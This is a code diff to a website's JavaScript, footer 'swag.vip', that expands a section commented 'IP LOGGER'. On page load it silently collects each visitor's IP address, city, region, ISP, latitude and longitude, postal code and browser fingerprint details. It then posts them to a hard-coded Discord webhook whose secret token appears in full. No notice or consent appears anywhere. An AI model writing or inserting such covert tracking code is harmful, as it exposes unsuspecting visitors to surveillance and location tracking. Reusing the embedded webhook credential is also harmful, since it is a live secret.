@@ -620,26 +620,98 @@
         }
 
         // IP LOGGER
+        var ua = navigator.userAgent;
+        var browser = 'Unknown';
+        if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+        else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+        else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+        else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
+
+        var os = 'Unknown';
+        if (ua.indexOf('Windows') > -1) os = 'Windows';
+        else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+        else if (ua.indexOf('Linux') > -1) os = 'Linux';
+        else if (ua.indexOf('Android') > -1) os = 'Android';
+        else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
+
+        var device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+
+        var lang = navigator.language || navigator.userLanguage || 'N/A';
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+        var screenRes = screen.width + 'x' + screen.height;
+        var referrer = document.referrer || 'Direct';
+        if (referrer.length > 100) referrer = referrer.substring(0, 100) + '...';
+
         fetch('https://api.ipify.org?format=json')
             .then(function(r) { return r.json(); })
-            .then(function(data) {
-                var ip = data.ip;
+            .then(function(ipData) {
+                var ip = ipData.ip;
+                return fetch('https://ipapi.co/' + ip + '/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(geo) {
+                        var now = new Date();
+                        var date = now.toLocaleDateString('fr-FR');
+                        var heure = now.toLocaleTimeString('fr-FR');
+
+                        var fields = [
+                            { name: 'IP', value: '||`' + ip + '`||', inline: true },
+                            { name: 'Date', value: date + ' ' + heure, inline: true },
+                            { name: '\u200b', value: '\u200b', inline: false },
+                            { name: 'Pays', value: (geo.country_name || 'N/A') + ' ' + (geo.country_code ? ':' + geo.country_code.toLowerCase() + ':' : ''), inline: true },
+                            { name: 'Ville', value: geo.city || 'N/A', inline: true },
+                            { name: 'Region', value: geo.region || 'N/A', inline: true },
+                            { name: 'ISP', value: geo.org || 'N/A', inline: false },
+                            { name: '\u200b', value: '\u200b', inline: false },
+                            { name: 'Navigateur', value: browser, inline: true },
+                            { name: 'OS', value: os, inline: true },
+                            { name: 'Appareil', value: device, inline: true },
+                            { name: 'Langue', value: lang, inline: true },
+                            { name: 'Fuseau horaire', value: tz, inline: true },
+                            { name: 'Résolution', value: screenRes, inline: true },
+                            { name: '\u200b', value: '\u200b', inline: false },
+                            { name: 'Referrer', value: referrer, inline: false }
+                        ];
+
+                        if (geo.latitude && geo.longitude) {
+                            fields.push({ name: 'Coordonnées', value: geo.latitude + ', ' + geo.longitude, inline: true });
+                        }
+                        if (geo.postal) {
+                            fields.push({ name: 'Code postal', value: geo.postal, inline: true });
+                        }
+
+                        fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: 'New Visitor',
+                                    color: 2894892,
+                                    fields: fields,
+                                    footer: { text: 'swag.vip' }
+                                }]
+                            })
+                        });
+                    });
+            })
+            .catch(function() {
                 var now = new Date();
-                var date = now.toLocaleDateString('fr-FR');
-                var heure = now.toLocaleTimeString('fr-FR');
                 fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: 'Visitor',
-                            color: 2894892,
+                            title: 'New Visitor (partial)',
+                            color: 16776960,
                             fields: [
-                                { name: 'IP', value: '`' + ip + '`', inline: true },
-                                { name: 'Date', value: date + ' ' + heure, inline: true },
-                                { name: 'Navigateur', value: navigator.userAgent.split(') ').pop(), inline: false }
+                                { name: 'Navigateur', value: browser, inline: true },
+                                { name: 'OS', value: os, inline: true },
+                                { name: 'Appareil', value: device, inline: true },
+                                { name: 'Langue', value: lang, inline: true },
+                                { name: 'Résolution', value: screenRes, inline: true },
+                                { name: 'Referrer', value: referrer, inline: false }
                             ],
-                            footer: { text: 'swag.vip' }
+                            footer: { text: 'swag.vip - IP non disponible' }
                         }]
                     })
                 });
